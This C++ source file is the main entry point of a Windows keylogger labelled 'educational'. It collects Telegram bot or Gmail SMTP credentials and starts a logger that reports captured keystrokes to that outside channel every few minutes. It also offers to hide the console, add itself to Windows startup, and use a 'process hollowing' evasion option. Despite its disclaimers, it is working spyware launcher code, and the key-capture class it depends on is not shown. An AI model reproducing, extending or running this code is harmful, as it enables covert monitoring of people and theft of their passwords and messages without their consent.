/**
 * @file main.cpp
 * @brief Main application entry point for educational keylogger
 * 
 * This is for EDUCATIONAL PURPOSES ONLY.
 * Unauthorized use of this code to monitor someone's activity without their
 * knowledge is illegal and unethical.
 */

// Standard includes
#include <iostream>
#include <limits>
#include <string>

// Windows-specific includes
#include <winsock2.h>
#include <windows.h>
#include <conio.h>

// Project includes
#include "../include/KeyLogger.h"

// Prevent Windows max macro from interfering with std::numeric_limits
#undef max

int main(int argc, char* argv[]) {
    std::cout << "==================================================" << std::endl;
    std::cout << "Educational Keylogger with Telegram Reporting" << std::endl;
    std::cout << "==================================================" << std::endl;
    std::cout << std::endl;
    std::cout << "DISCLAIMER: This application is intended for educational" << std::endl;
    std::cout << "purposes only. Using this software to monitor someone's" << std::endl;
    std::cout << "activity without their knowledge and consent is illegal" << std::endl;
    std::cout << "and unethical." << std::endl;
    std::cout << std::endl;
    
    // Attempt to create a mutex to ensure only one instance runs
    HANDLE hMutex = CreateMutexA(NULL, TRUE, "KeyloggerEducationalMutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        std::cout << "The application is already running." << std::endl;
        std::cout << "Press any key to exit..." << std::endl;
        _getch();
        return 0;
    }
    
    // Configuration variables
    std::string telegramBotToken, telegramChatId;
    std::string email, password, smtpServer;
    int smtpPort = 587;
    int reportInterval = 300; // 5 minutes by default
    bool useTelegram = false;
    bool useProcessHollowing = false; // Educational only - not for malicious use
    
    // Ask which communication method to use
    char commMethod;
    std::cout << "Select communication method:" << std::endl;
    std::cout << "1. Telegram (recommended)" << std::endl;
    std::cout << "2. Email (legacy)" << std::endl;
    std::cout << "Choice: ";
    std::cin >> commMethod;
    
    // Clear input buffer
    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
    
    if (commMethod == '1') {
        // Telegram configuration
        useTelegram = true;
        
        std::cout << std::endl << "Telegram Configuration" << std::endl;
        std::cout << "----------------------" << std::endl;
        std::cout << "Bot Token: ";
        std::getline(std::cin, telegramBotToken);
        
        std::cout << "Chat ID: ";
        std::getline(std::cin, telegramChatId);
    } else {
        // Email configuration
        std::cout << std::endl << "Email Configuration" << std::endl;
        std::cout << "-------------------" << std::endl;
        std::cout << "Email address: ";
        std::getline(std::cin, email);
        
        std::cout << "Password (for Gmail, use App Password): ";
        // Simple password masking
        char ch;
        while ((ch = _getch()) != '\r') {
            if (ch == '\b' && !password.empty()) {
                password.pop_back();
                std::cout << "\b \b";
            } else if (ch != '\b') {
                password.push_back(ch);
                std::cout << '*';
            }
        }
        std::cout << std::endl;
        
        // Ask for SMTP settings if not using defaults
        char useDef;
        std::cout << std::endl << "Use default SMTP settings (smtp.gmail.com:587)? (y/n): ";
        std::cin >> useDef;
        
        if (tolower(useDef) == 'n') {
            std::cin.ignore();
            
            std::cout << "SMTP server: ";
            std::getline(std::cin, smtpServer);
            
            std::cout << "SMTP port: ";
            std::cin >> smtpPort;
        } else {
            smtpServer = "smtp.gmail.com";
        }
        
        std::cin.ignore();
    }
    
    // Common settings
    std::cout << std::endl << "Common Settings" << std::endl;
    std::cout << "---------------" << std::endl;
    
    std::cout << "Report interval (seconds, default 300): ";
    std::string intervalStr;
    std::getline(std::cin, intervalStr);
    if (!intervalStr.empty()) {
        reportInterval = std::stoi(intervalStr);
    }
    
    // Educational feature
    std::cout << std::endl << "Educational Settings" << std::endl;
    std::cout << "--------------------" << std::endl;
    
    std::cout << "Enable process hollowing simulation? (educational only) (y/n): ";
    char procHollow;
    std::cin >> procHollow;
    useProcessHollowing = (tolower(procHollow) == 'y');
    
    if (useProcessHollowing) {
        std::cout << std::endl;
        std::cout << "NOTE: Process hollowing is included for educational purposes" << std::endl;
        std::cout << "to demonstrate the concept. This is a simulation only." << std::endl;
        std::cout << std::endl;
    }
    
    std::cout << std::endl << "Starting keylogger..." << std::endl;
    
    // Create and start the keylogger
    KeyLogger* keylogger = nullptr;
    
    if (useTelegram) {
        keylogger = new KeyLogger(telegramBotToken, telegramChatId, reportInterval);
    } else {
        keylogger = new KeyLogger(email, password, smtpServer, smtpPort, reportInterval);
    }
    
    // Ask if user wants to run in hidden mode
    char hideMode;
    std::cout << "Run in hidden mode? (y/n): ";
    std::cin >> hideMode;
    
    bool hideConsole = (tolower(hideMode) == 'y');
    bool addToStartup = false;
    
    // Ask if application should start with Windows
    if (hideConsole) {
        char startupMode;
        std::cout << "Add to Windows startup? (y/n): ";
        std::cin >> startupMode;
        addToStartup = (tolower(startupMode) == 'y');
    }
    
    // Start the keylogger
    if (!keylogger->start(hideConsole, addToStartup, useProcessHollowing)) {
        std::cout << "Failed to start keylogger. Check permissions." << std::endl;
        std::cout << "Press any key to exit..." << std::endl;
        _getch();
        delete keylogger;
        return 1;
    }
    
    if (!hideConsole) {
        std::cout << "Keylogger is running. Press any key to stop..." << std::endl;
        _getch(); // Wait for key press
        keylogger->stop();
        std::cout << "Keylogger stopped." << std::endl;
    } else {
        // If hidden mode, we need to run a message loop for the keyboard hook
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }
    
    delete keylogger;
    return 0;
} 